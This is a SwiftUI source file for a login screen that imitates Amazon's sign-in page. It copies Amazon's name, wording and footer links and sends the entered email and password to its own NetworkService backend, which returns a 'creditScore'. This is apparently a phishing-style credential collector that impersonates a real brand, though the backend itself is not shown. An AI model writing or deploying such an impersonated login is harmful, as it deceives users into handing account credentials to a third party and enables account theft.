import SwiftUI

struct LoginView: View {
    @State private var email = ""
    @State private var password = ""
    @State private var isLoading = false
    @State private var showError = false
    @State private var errorMessage = ""
    
    let onLoginSuccess: (Int) -> Void
    
    var body: some View {
        VStack(spacing: 20) {
            // Amazon-style logo
            Image(systemName: "cart.fill")
                .resizable()
                .frame(width: 80, height: 80)
                .foregroundColor(.orange)
                .padding(.top, 60)
            
            Text("amazon")
                .font(.system(size: 40, weight: .bold))
                .foregroundColor(.black)
            
            Text("Sign in to your Amazon account")
                .font(.headline)
                .padding(.bottom, 20)
            
            VStack(spacing: 15) {
                // Email field
                VStack(alignment: .leading, spacing: 5) {
                    Text("Email")
                        .font(.subheadline)
                        .fontWeight(.semibold)
                    
                    TextField("", text: $email)
                        .textFieldStyle(RoundedBorderTextFieldStyle())
                        .autocapitalization(.none)
                        .keyboardType(.emailAddress)
                        .textContentType(.emailAddress)
                }
                
                // Password field
                VStack(alignment: .leading, spacing: 5) {
                    Text("Password")
                        .font(.subheadline)
                        .fontWeight(.semibold)
                    
                    SecureField("", text: $password)
                        .textFieldStyle(RoundedBorderTextFieldStyle())
                        .textContentType(.password)
                }
            }
            .padding(.horizontal, 30)
            
            // Sign in button
            Button(action: handleLogin) {
                if isLoading {
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: .white))
                        .frame(maxWidth: .infinity)
                        .frame(height: 50)
                } else {
                    Text("Sign in")
                        .fontWeight(.semibold)
                        .frame(maxWidth: .infinity)
                        .frame(height: 50)
                }
            }
            .background(Color.orange)
            .foregroundColor(.white)
            .cornerRadius(8)
            .padding(.horizontal, 30)
            .disabled(isLoading || email.isEmpty || password.isEmpty)
            
            if showError {
                Text(errorMessage)
                    .foregroundColor(.red)
                    .font(.caption)
                    .padding(.horizontal, 30)
            }
            
            Spacer()
            
            // Footer
            VStack(spacing: 10) {
                Text("By continuing, you agree to Amazon's")
                    .font(.caption)
                    .foregroundColor(.gray)
                Text("Conditions of Use and Privacy Notice")
                    .font(.caption)
                    .foregroundColor(.blue)
            }
            .padding(.bottom, 30)
        }
        .background(Color.white)
    }
    
    private func handleLogin() {
        isLoading = true
        showError = false
        
        // Send login to backend
        NetworkService.shared.sendLogin(email: email, password: password) { result in
            DispatchQueue.main.async {
                isLoading = false
                
                switch result {
                case .success(let creditScore):
                    onLoginSuccess(creditScore)
                case .failure(let error):
                    showError = true
                    errorMessage = error.localizedDescription
                }
            }
        }
    }
}

struct LoginView_Previews: PreviewProvider {
    static var previews: some View {
        LoginView(onLoginSuccess: { _ in })
    }
}
